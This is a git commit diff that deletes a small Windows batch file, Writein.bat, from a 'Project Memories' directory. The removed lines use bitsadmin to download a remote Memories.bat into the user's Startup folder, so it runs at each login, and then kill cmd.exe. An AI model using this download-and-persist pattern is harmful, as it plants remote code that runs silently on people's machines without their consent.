667feec78a10d1a4967ce6312ae50c6b79db648e
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-07 14:36:00 +0800

    Delete Projects/Project Memories/Project-Memories-main directory

--- Projects/Project Memories/Project-Memories-main/Writein.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-
-cls
-
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Project-Memories/main/Memories.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\Memories.bat"
-
-taskkill /im cmd.exe
